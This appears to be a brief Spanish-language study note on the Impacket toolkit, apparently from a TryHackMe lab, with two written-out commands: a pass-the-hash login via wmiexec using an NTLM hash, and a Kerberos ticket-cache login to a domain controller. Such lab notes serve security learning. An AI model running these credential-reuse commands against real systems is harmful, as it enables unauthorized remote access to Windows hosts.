![[Pasted image 20250215132946.png]]

es una herramienta que tiene otra incluidas, por ejemplo podemos hacer un pass the hash
![[Pasted image 20250215133116.png]]
```bash
wmiexec. py -hashes 00000000000000000000000000000000:5c4d59391f656d5958dab124ffeabc20 administrator@10.4.25.201

```

ccache wmiexec

```bash
export KRB5CCNAME=Administrator.ccache; impacket-wmiexec K2.THM/Administrator@K2ROOTDC.K2.THM -k -no-pass
```
